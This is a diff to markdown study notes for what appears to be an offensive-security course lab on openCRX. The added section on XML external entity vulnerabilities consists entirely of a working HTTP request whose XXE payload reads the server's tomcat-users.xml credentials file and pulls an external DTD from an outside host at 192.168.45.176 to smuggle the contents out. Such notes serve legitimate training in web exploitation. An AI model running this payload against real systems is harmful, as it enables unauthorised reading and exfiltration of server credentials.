@@ -228,3 +228,22 @@ Then run it: `java OpenCRXToken <start_timestamp> <stop_timestamp> > tokens.txt`
 ### Automating Resets
 Script: https://github.com/m0hammad-yaser/OSWE-AWAE-Notes/blob/main/openCRX/xxe_lfd.py#L20C21-L20C21
 ## XML External Entity Vulnerability
+```
+POST /opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account HTTP/1.1
+Host: opencrx:8080
+Content-Type: application/xml
+Authorization: Basic Z3Vlc3Q6TmV3UGFzc3dvcmQhMTIzNA==
+
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY % start "<![CDATA[">
+<!ENTITY % file SYSTEM "file:///home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml" >
+<!ENTITY % end "]]>">
+<!ENTITY % dtd SYSTEM "http://192.168.45.176/wrapper.dtd" >
+%dtd;
+]>
+<org.opencrx.kernel.account1.Contact>
+  <lastName>&wrapper;</lastName>
+  <firstName>Tom</firstName>
+</org.opencrx.kernel.account1.Contact>
+```
